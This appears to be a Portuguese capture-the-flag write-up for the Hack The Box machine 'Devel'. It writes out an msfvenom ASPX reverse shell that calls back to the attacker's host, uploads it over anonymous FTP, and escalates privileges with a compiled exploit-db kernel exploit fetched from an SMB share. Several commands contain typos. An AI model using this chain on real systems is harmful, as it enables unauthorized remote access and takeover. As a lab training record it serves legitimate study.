Devel
========================

## Enumeration

    sudo nmap_enum

![qownnotes-media-DghKCJ](../../../media/qownnotes-media-DghKCJ.png)


    ftp -a devel.htb

![qownnotes-media-CTgBKL](../../../media/qownnotes-media-CTgBKL.png)

Vamos so verificar se temos permissao de escrita via FTP

    mkdir test

Com isso ficou facil a exploraao, dado que este e o mesmo diretorio que o IIS utiliza para hospedar os arquivos.


## Exploitation

    msfvenom -p windows/shell_reveerse_tcp -f aspx LHOST=10.10.14.134 lLPORT=80 > rshell.aspx
    
    ftp -a devel.htb
    put rshell.aspx
    
    #preparando a shell reversa
    nc -nlvp 80
    
    firefox http://devel.htb/rshell.aspx

![qownnotes-media-hUSMVS](../../../media/qownnotes-media-hUSMVS.png)

Por se tratar de um sistema operacional mais antigo, vamos iniciar com exploits de Kernel (embora eu tenha tentado o PrintSpoofer32.eexe primeiro)

pesquisa no google:

    windows 7 6.1 build 7600 privilege escalation
    
![qownnotes-media-BTMhzB](../../../media/qownnotes-media-BTMhzB.png)

<https://www.exploit-db.com/raw/40564>

Com a instrucao que esta no exploit podemos concluir que devemos compilar esse exploit com o seguinte comando:

    i686-w64-mingw32-gcc priv_esc.c -o privesc_exploit.exe -lws2_32
    
    impacket-smbserver smb .

Na maquina alvo, fazemos o upload do arquivo para la:

    cp \\10.10.14.134\smb\privesc_exploit.exe
    privesc_exploit.exe
    
    whoami